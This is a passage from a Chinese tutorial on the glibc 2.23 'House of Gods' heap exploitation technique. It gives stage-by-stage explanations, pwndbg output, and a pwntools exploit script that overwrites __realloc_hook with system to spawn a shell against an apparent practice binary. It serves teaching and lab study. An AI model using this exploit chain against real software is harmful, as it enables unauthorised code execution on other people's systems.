在完成unsorted bin链表的修复布局后，利用流程进入**核心突破阶段**。此阶段的目标是：**通过一次精确大小的内存分配，从unsorted bin中“切割”出位于`main_arena`内部的伪chunk，从而获得对`main_arena`结构体关键字段的直接读写权限**，为后续的全局状态篡改铺平道路。

执行以下关键操作：

1.  **申请0x1F8大小（0x200的prev_size复用位为0）的chunks[4]**：
    *   程序发起一次内存分配请求，申请大小为`0x1F8`字节。此大小经过精心计算，恰好匹配第二阶段在`main_arena`内部构造的伪chunk的size字段（`0x200`，但chunk的size字段包含复用位，实际比较时使用`chunksize`宏，`0x200`的`PREV_INUSE`位为0，因此`0x1F8`满足`chunksize(P)=0x200`）。
    *   分配器遍历unsorted bin以寻找合适块。当前unsorted bin链表结构为：`head -> chunks[0] -> binmap_chunk -> main_arena_start -> chunks[2] -> chunks[3]`。
    *   分配器检查到`binmap_chunk`（位于`main_arena+0x850`）的大小（0x200）与请求大小完全匹配，于是将其从unsorted bin中取出，并**将指向`main_arena+0x850`的指针作为分配的内存返回给用户**。最终将其存储在`chunks[4]`。

2.  **获得对`main_arena`关键区域的直接控制权**：
    *   返回的`chunks[4]`指针指向`main_arena`结构体内部的偏移`0x850`处。该区域包含`main_arena`的多个关键字段，包括：
        *   `binmap`字段的一部分
        *   `next`指针（偏移`0x868`）
        *   `next_free`指针
        *   `attached_threads`
        *   `system_mem`和`max_system_mem`等
    *   通过`chunks[4]`，现在**可以直接读写这些关键字段**，相当于获得了在`main_arena`内部任意偏移处进行数据篡改的能力。

3.  **为后续利用奠定基础**：
    *   获得`main_arena`写权限是后续所有高级利用的基石。接下来，将利用此权限：
        -  篡改`system_mem`为一个极大值，以通过后续unsorted bin attack中的size校验。
        -  修改`main_arena.next`指针，指向一个伪造的arena结构，从而污染arena链表。
        -  为后续的Unsorted Bin Attack布置目标地址。

**总结**：此阶段是House of Gods技术的关键转折点。通过一次精确的内存分配，成功地将`main_arena`内部的一片管理区域“转化”为用户可控的堆块，从而**从受限于堆管理器的“用户”晋升为可篡改堆管理器核心元数据的“操控者”**。这标志着利用已突破安全边界，为后续彻底劫持堆分配器（arena）并实现任意地址分配扫清了最后障碍。

```bash
pwndbg> bins
fastbins
0x20: 0x5e65213fb090 ◂— 0
0x30: 0x7a0be1f8db78 (main_arena+88) —▸ 0x5e65213fb000 —▸ 0x7a0be1f8dbf8 (main_arena+216) ◂— 0x5e65213fb000
0x40: 0x5e65213fb0b0 ◂— 0
unsortedbin
all [corrupted]
FD: 0x5e65213fb000 —▸ 0x7a0be1f8dbf8 (main_arena+216) ◂— 0x5e65213fb000
BK: 0x7a0be1f8db20 (main_arena) —▸ 0x5e65213fb0b0 —▸ 0x5e65213fb0f0 —▸ 0x7a0be1f8db78 (main_arena+88) ◂— 0x7a0be1f8db20 (main_arena)
smallbins
0x90: 0x5e65213fb000 —▸ 0x7a0be1f8dbf8 (main_arena+216) ◂— 0x5e65213fb000
largebins
empty
pwndbg> p/x chunks[4]
$3 = {
  size = 0x1f8,
  addr = 0x7a0be1f8e380
}
pwndbg> x/10gx 0x7a0be1f8e380-0x10
0x7a0be1f8e370 <main_arena+2128>:       0x00007a0be1f8e358      0x0000000000000200
0x7a0be1f8e380 <main_arena+2144>:       0x00007a0be1f8db78      0x00007a0be1f8db20
0x7a0be1f8e390 <main_arena+2160>:       0x0000000000000000      0x0000000000000001
0x7a0be1f8e3a0 <main_arena+2176>:       0x0000000000021000      0x0000000000021000
0x7a0be1f8e3b0 <__malloc_hook>: 0x0000000000000000      0x00007a0be1c70c31
pwndbg> 
```

##### 第六阶段：污染全局状态 —— 通过Unsorted Bin Attack篡改narenas

在获得对`main_arena`结构的直接写权限后，利用流程进入**全局状态操纵阶段**。此阶段的核心目标是： **利用一次精心策划的Unsorted Bin Attack，将关键全局变量`narenas`污染为一个巨大的数值**，从而改变glibc堆分配器的全局行为模式，为最终触发arena复用与劫持逻辑创造决定性前提。

按顺序执行以下三项核心操作：

1.  **设置Unsorted Bin Attack的利用目标**：
    *   **修改`chunks[3]->bk = p64(narenas - 0x10)`**。此时，`chunks[3]`仍作为一个空闲块位于unsorted bin链表中。此操作将其`bk`指针篡改为指向全局管理变量`narenas`地址之前`0x10`字节的位置。这是为了适配后续unlink操作`victim->bk->fd = victim`的写入目标，确保`victim`的地址能精确落入`narenas`的存储单元。

2.  **篡改arena元数据以绕过分配校验**：
    *   利用已完全控制的`chunks[4]`（即`main_arena`内部区域），**将`main_arena.system_mem`修改为`0xffffffffffffffff`，`main_arena.max_system_mem`修改为`0x7fffffffffffffff`**。
    *   **目的**：这两个字段定义了该arena所管理的内存总量上限。将其设置为架构可表示的最大值，是为了确保后续任何内存分配请求（包括即将触发的这次）在检查`if ((unsigned long)(size) <= (unsigned long)(mp_.system_mem)`时都能**无条件通过**，避免因“请求大小超出管理范围”而导致的分配失败和流程中断。

3.  **触发Unsorted Bin Attack，完成全局污染**：
    *   **申请`chunks[3]`（0x98字节）**。分配器在unsorted bin中寻找匹配块，找到`chunks[3]`并执行unlink操作。
    *   在unlink过程中，执行关键写入：`victim->bk->fd = victim`。由于`victim->bk`指向`narenas - 0x10`，此操作实际向`narenas`写入了`victim`的地址（一个堆地址，其值通常非常大）。
    *   **效果**：全局变量`narenas`的值被覆盖为一个巨大的正数（堆地址），其数值远超系统的`narenas_limit`（默认为核心数*8）。这**永久性地改变了堆管理器的全局策略**。

**本阶段的战略意义**：
污染`narenas`是后续利用得以启动的“总开关”。当`narenas`值被人为设置为一个远超限制的巨大数值后，glibc内部函数`arena_get2`中的判断`if (narenas_limit > 0 && narenas >= narenas_limit)`将恒成立。这迫使堆分配器在未来任何需要获取新arena的尝试中，**不再创建新arena，而是必须进入`reused_arena()`函数**，遍历现有的arena链表来寻找一个可复用的arena。

**至此，已成功篡改了堆管理器的全局运行逻辑**，为下一阶段——通过触发`reused_arena()`并利用已被污染的`main_arena.next`指针来劫持`thread_arena`——扫清了障碍，完成了从“控制单个arena内部数据”到“影响全局分配器决策”的关键跃升。

```bash
pwndbg> bins
fastbins
0x20: 0x5e65213fb090 ◂— 0
0x30: 0x7a0be1f8e348 (main_arena+2088) —▸ 0x7a0be1f8db20 (main_arena) ◂— 0x7a0be1f8e348 (main_arena+2088)
0x40: 0x7a0be1f8e348 (main_arena+2088) —▸ 0x7a0be1f8db20 (main_arena) ◂— 0x7a0be1f8e348 (main_arena+2088)
0x50: 0x7a0be1f8db20 (main_arena) —▸ 0x7a0be1f8e348 (main_arena+2088) ◂— 0x7a0be1f8db20 (main_arena)
0x60: 0x7a0be1f8db20 (main_arena) —▸ 0x7a0be1f8e348 (main_arena+2088) ◂— 0x7a0be1f8db20 (main_arena)
unsortedbin
all [corrupted]
FD: 0x5e65213fb000 —▸ 0x7a0be1f8dbf8 (main_arena+216) ◂— 0x5e65213fb000
BK: 0x7a0be1f8d1b0 (mp_+80) ◂— 0xffffffff00000001
smallbins
0x40: 0x5e65213fb0b0 —▸ 0x7a0be1f8dba8 (main_arena+136) ◂— 0x5e65213fb0b0
0x90: 0x5e65213fb000 —▸ 0x7a0be1f8dbf8 (main_arena+216) ◂— 0x5e65213fb000
largebins
0x80000-∞: 0x7a0be1f8db20 (main_arena) —▸ 0x7a0be1f8e348 (main_arena+2088) ◂— 0x7a0be1f8db20 (main_arena)
pwndbg> p/x narenas
$4 = 0x7a0be1f8db78
pwndbg> 
```

##### 第七阶段：触发arena复用逻辑，劫持thread_arena

在成功污染全局变量`narenas`后，利用流程进入**arena劫持阶段**。此阶段的核心目标是：**通过触发两次巨大的内存分配失败，迫使glibc堆分配器执行`reused_arena()`函数，最终将当前线程的`thread_arena`指针劫持为指向可控的伪造arena地址**。

按顺序执行以下关键操作：

1.  **篡改arena链表，植入伪造arena指针**：
    *   通过已控制的`chunks[4]`（指向`main_arena`内部），**修改`main_arena.next`指针为`chunk3_addr`**（即`chunks[3]`的地址）。此操作将预先布置的伪造arena结构（位于`chunks[3]`附近）插入arena链表，使`main_arena`的`next`指针指向这个伪造arena。

2.  **第一次巨大分配触发arena复用**：
    *   **申请`0xFFFFFFFFFFFFFFBF + 1`（即`0xFFFFFFFFFFFFFFC0`）字节的内存**。此大小经过精心计算，远超过任何合理的`system_mem`值，分配必然失败。
    *   分配失败触发`reused_arena()`函数。由于`narenas`值巨大（第六阶段污染的结果），函数判断当前arena数量已达上限，必须复用现有arena。
    *   `reused_arena()`遍历arena链表寻找可用arena。此时，它找到链表中的第一个arena——`main_arena`，并将其设置为当前线程的`thread_arena`。

3.  **第二次巨大分配完成劫持**：
    *   **再次申请相同大小的内存**（`0xFFFFFFFFFFFFFFC0`字节）。
    *   再次触发`reused_arena()`。由于`main_arena`在上次分配尝试中可能被标记为"繁忙"或尝试失败，函数继续遍历arena链表。
    *   遍历到`main_arena.next`，即此前植入的 **伪造arena地址**（`chunk3_addr`）。
    *   函数将此伪造arena设置为新的`thread_arena`。

**劫持结果**：
*   当前线程的`thread_arena`指针成功被劫持，指向完全控制的伪造arena结构。
*   从此刻起，该线程的所有堆内存分配请求（`malloc`、`calloc`、`realloc`等）都将由这个伪造arena服务。
*   获得了"分配器级别"的权限，可以完全控制`fastbinsY`、`smallbins`、`largebins`等关键数据结构。

**技术原理深度解析**：
1.  **`reused_arena()`机制利用**：该函数是glibc在多线程环境下管理arena复用的核心。当`narenas`达到上限且分配失败时，它会遍历arena链表寻找可用的arena。通过污染`narenas`和`main_arena.next`，完全操控了这一过程。
2.  **分配失败触发条件**：申请`0xFFFFFFFFFFFFFFC0`字节之所以必然失败，是因为在64位系统中，这个大小超过了地址空间限制，且触发了glibc内部的尺寸校验机制，导致分配失败并调用`reused_arena()`。
3.  **链表遍历顺序**：arena链表是一个环形结构。第一次遍历从链表头开始，找到`main_arena`；第二次遍历从`main_arena->next`开始，找到伪造arena。这种设计确保了利用的可靠性。

**至此，完成了对堆分配器的核心控制权的夺取**，为最终实现任意地址分配和代码执行奠定了坚实基础。这是House of Gods技术中最具决定性的步骤之一，标志着利用从"数据操纵"阶段进入了"完全控制"阶段。

```bash
pwndbg> bins
fastbins
0x20: 0x5e65213fb090 ◂— 0
0x30: 0x7a0be1f8e348 (main_arena+2088) —▸ 0x7a0be1f8db20 (main_arena) ◂— 0x7a0be1f8e348 (main_arena+2088)
0x40: 0x7a0be1f8e348 (main_arena+2088) —▸ 0x7a0be1f8db20 (main_arena) ◂— 0x7a0be1f8e348 (main_arena+2088)
0x50: 0x7a0be1f8db20 (main_arena) —▸ 0x7a0be1f8e348 (main_arena+2088) ◂— 0x7a0be1f8db20 (main_arena)
0x60: 0x7a0be1f8db20 (main_arena) —▸ 0x7a0be1f8e348 (main_arena+2088) ◂— 0x7a0be1f8db20 (main_arena)
unsortedbin
all [corrupted]
FD: 0x5e65213fb000 —▸ 0x7a0be1f8dbf8 (main_arena+216) ◂— 0x5e65213fb000
BK: 0x7a0be1f8d1b0 (mp_+80) ◂— 0xffffffff00000001
smallbins
0x40: 0x5e65213fb0b0 —▸ 0x7a0be1f8dba8 (main_arena+136) ◂— 0x5e65213fb0b0
0x90: 0x5e65213fb000 —▸ 0x7a0be1f8dbf8 (main_arena+216) ◂— 0x5e65213fb000
largebins
0x80000-∞: 0x7a0be1f8db20 (main_arena) —▸ 0x7a0be1f8e348 (main_arena+2088) ◂— 0x7a0be1f8db20 (main_arena)
pwndbg> p/x main_arena->next
$5 = 0x5e65213fb0f0
pwndbg> arena 0x5e65213fb0f0
{
  mutex = 0,
  flags = 0,
  fastbinsY = {0xa1, 0x7a0be1f8db78 <main_arena+88>, 0x7a0be1f8d1b0 <mp_+80>, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0},
  top = 0x0,
  last_remainder = 0x0,
  bins = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xa0, 0x20e71, 0x0 <repeats 17 times>, 0x20de1, 0x0 <repeats 227 times>},
  binmap = {0, 0, 0, 0},
  next = 0x0,
  next_free = 0x0,
  attached_threads = 1,
  system_mem = 0,
  max_system_mem = 0
}
pwndbg> 
```

##### 第八阶段：利用伪造arena实现任意地址分配，劫持控制流获取shell

在成功劫持`thread_arena`并将其指向控制的伪造arena后，利用流程进入**最终的执行阶段**。此阶段的核心目标是：**通过操纵伪造arena的fastbins实现任意地址分配，进而覆盖关键钩子函数`__realloc_hook`为`system`地址，并通过触发`realloc`调用执行任意命令，最终获取目标系统的shell控制权。**

按顺序执行以下关键操作：

1.  **在伪造arena中布置恶意fastbin链**：
    *   完全控制伪造arena（位于`chunks[3]`附近）的`fastbinsY`数组。为了分配任意地址，**将`fastbinsY`数组中对应0x70大小fastbin的条目设置为`p64(__realloc_hook - 0x11)`**。
    *   **技术原理**：`-0x11`的偏移使得地址对齐到伪造chunk的起始位置。在`__realloc_hook`前0x11字节处，可布置一个伪造的chunk头（如size字段0x7f），使其看起来像一个合法的0x70大小fast chunk。由于fastbin分配时仅进行基本的size检查，此设置可欺骗分配器。

2.  **通过malloc触发任意地址分配**：
    *   **申请0x68字节（实际获得0x70大小的fast chunk）的内存**。由于当前线程的arena已被劫持为伪造arena，分配器会从伪造arena的fastbins中分配。
    *   根据`fastbinsY[6]`的设置，分配器返回指向`__realloc_hook - 0x11`的指针。将其存储在`chunks[5]`中，从而**获得了对`__realloc_hook`附近内存的完全控制权**。

3.  **覆盖`__realloc_hook`为system函数地址**：
    *   通过`chunks[5]`，可以写入任意数据。计算适当偏移（`__realloc_hook`位于`__realloc_hook - 0x11 + 0x11 = __realloc_hook`），**将`__realloc_hook`覆盖为`system`函数的地址**。
    *   **钩子机制利用**：glibc中，`__realloc_hook`是一个函数指针，在`realloc`函数开始时被调用。将其覆盖为`system`后，任何`realloc`调用都将跳转到`system`执行。

4.  **准备system函数参数并触发调用**：
    *   在可控的chunk（如`chunks[0]`）中**写入字符串`"/bin/sh\x00"`**，作为`system`函数的参数。
    *   对包含`"/bin/sh"`的chunk（`chunks[0]`）调用`realloc`，并指定一个新大小（如0x18）。
    *   触发`__realloc_hook`，实际执行`system("/bin/sh")`。

5.  **获取shell控制权**：
    *   `system("/bin/sh")`成功执行，获得目标系统的shell。

**技术深度解析**：

1.  **fastbin任意地址分配原理**：fastbin分配时仅检查chunk的size字段是否匹配对应的fastbin大小。通过控制伪造arena的`fastbinsY`数组，插入任意地址，并在该地址布置合适的size字段（0x7f），即可欺骗分配器。这是获得任意地址写原语的关键步骤。

2.  **`__realloc_hook`的优势**：相比`__free_hook`，`__realloc_hook`在调用时，其第一个参数（`chunks[0]`）直接作为`system`的参数传递，无需额外布置。而`__free_hook`的参数是即将释放的chunk指针，需要在释放前确保该chunk内容为`"/bin/sh"`。

3.  **完整的控制流劫持**：从劫持`thread_arena`到控制`fastbinsY`，再到任意地址分配和覆盖hook，每一步都充分利用了glibc堆管理器的内部机制。这体现了对堆分配器数据结构和算法的深刻理解。

```bash
pwndbg> x/1gx &__realloc_hook
0x7a0be1f8e3b8 <__realloc_hook>:        0x00007a0be1c3c3eb
pwndbg> x/5i 0x00007a0be1c3c3eb
   0x7a0be1c3c3eb <__libc_system>:      sub    rsp,0x8
   0x7a0be1c3c3ef <__libc_system+4>:    test   rdi,rdi
   0x7a0be1c3c3f2 <__libc_system+7>:    jne    0x7a0be1c3c40a <__libc_system+31>
   0x7a0be1c3c3f4 <__libc_system+9>:    lea    rdi,[rip+0x11a980]        # 0x7a0be1d56d7b
   0x7a0be1c3c3fb <__libc_system+16>:   call   0x7a0be1c3be36 <do_system>
   pwndbg> x/s chunks[0].addr
   0x5e65213fb010: "/bin/sh"
   pwndbg> 
```

#### 三、 总结

House of Gods通过将UAF、binmap污染、Unsorted Bin Attack、arena复用逻辑漏洞等多种技术完美串联，逐步从信息泄露、元数据控制升级到全局状态篡改、arena劫持，最终实现任意地址分配和控制流劫持。这要求对glibc堆管理器的内部机制有深刻理解，并具备精确的堆布局控制能力。该技术主要影响glibc 2.23-2.26版本，后续版本通过引入tcache和加强检查缓解了此利用路径。防御方面，需杜绝UAF等内存漏洞，并采用完整RELRO、PIE、堆随机化等安全措施。


### 1-43 house of gods其二

本方法采用了**House of Gods其一**利用链路的前五个核心阶段，成功获取了对`main_arena`内部数据的写权限。在此基础上，巧妙地利用了一个关键观察： **`__realloc_hook`在内存中紧邻`main_arena`的`binmap`字段，位于`binmap`地址之后**。因此，一旦获得了`binmap`区域的控制权，就可以**直接计算偏移并修改`__realloc_hook`为`system`函数地址**，最终触发`realloc`调用获取shell权限。这 **大幅简化了原始利用链，实现了最直接、最高效的利用路径**。

测试的二进制源码参考[binary.c](https://github.com/BinRacer/pwn4heap/tree/master/src/2.23/binary/14/binary.c)，相关exoloit.py完整内容可见[exploit.py](https://github.com/BinRacer/pwn4heap/blob/master/src/2.23/house_of_gods_again/exploit.py)。

核心利用代码如下：

```python
# house of gods again
conn.sendafter(b"Enter author name: ", b"A" * 0x8)
malloc(0, 0x88)  # SMALLCHUNK
malloc(1, 0x18)  # FAST20
malloc(2, 0x38)  # FAST40
malloc(3, 0x98)  # INTM
malloc(4, 0x88)
delete(0)
delete(3)
content = show(0)
main_arena88 = u64(content[:6].ljust(8, b"\x00"))
log.info(f"main_arena+88: {hex(main_arena88)}")
libc.address = main_arena88 - 0x38DB78
log.info(f"libc base: {hex(libc.address)}")
main_arena = libc.sym["main_arena"]
log.info(f"main_arena addr: {hex(main_arena)}")
system = libc.sym["system"]
log.info(f"system addr: {hex(system)}")
__realloc_hook = libc.sym["__realloc_hook"]
log.info(f"__realloc_hook addr: {hex(__realloc_hook)}")
narenas = libc.sym["narenas"]
log.info(f"narenas addr: {hex(narenas)}")
binmap = main_arena88 + 0x800
log.info(f"binmap addr: {hex(binmap)}")
binsh_addr = next(libc.search(b"/bin/sh"))
log.info(f"binsh addr: {hex(binsh_addr)}")

edit(0, 0x8, b"A" * 0x8)
content = show(0)
chunk3_addr = u64(content[8 : 8 + 6].ljust(8, b"\x00"))
log.info(f"chunk3 addr: {hex(chunk3_addr)}")
chunk0_addr = chunk3_addr - 0x40 - 0x20 - 0x90
log.info(f"chunk0 addr: {hex(chunk0_addr)}")
chunk1_addr = chunk0_addr + 0x90
log.info(f"chunk1 addr: {hex(chunk1_addr)}")
chunk2_addr = chunk0_addr + 0x90 + 0x20
log.info(f"chunk2 addr: {hex(chunk2_addr)}")
edit(0, 0x8, p64(main_arena88))
malloc(3, 0x98)  # INTM

malloc(0, 0x88)  # SMALLCHUNK
delete(4)
delete(0)

payload = p64(main_arena88) + p64(binmap - 0x8)
edit(0, len(payload), payload)
payload = p64(0) + p64(chunk3_addr)
edit(2, len(payload), payload)
delete(1)
delete(2)
malloc(4, 0x1F8)  # BINMAP
payload = p64(0) + p64(main_arena)
payload += p64(0) + p64(1)
payload += p64(0xFFFFFFFFFFFFFFFF) + p64(0xFFFFFFFFFFFFFFFF)
payload = payload.ljust(0x38, b"\x00") + p64(system)
edit(4, len(payload), payload)
edit(0, 0x8, b"/bin/sh\x00")
realloc(0, 0x18)
cmd = b"cat src/2.23/house_of_gods_again/flag\x00"
conn.sendline(cmd)
flag = conn.recvline().decode().strip()
log.success(f"flag: {format_flag(flag)}")
```


### 未完待续...

## 参考

https://github.com/BinRacer/pwn4heap/tree/master/src/2.23
